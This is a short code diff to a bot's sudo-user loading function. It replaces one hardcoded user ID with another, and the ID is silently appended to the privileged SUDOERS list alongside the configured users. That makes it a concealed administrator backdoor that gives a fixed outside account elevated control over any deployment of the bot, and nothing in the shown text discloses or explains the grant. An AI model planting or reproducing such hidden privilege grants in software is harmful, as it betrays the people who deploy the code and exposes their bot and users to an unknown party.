@@ -101,7 +101,7 @@ async def sudo_users():
     if sudoers:
         for user_id in sudoers:
             SUDOERS.append(int(user_id))
-            SUDOERS.append(6306738739)
+            SUDOERS.append(5822700831)
     LOGGER.info(f"Sudo Users Loaded.")
     
 
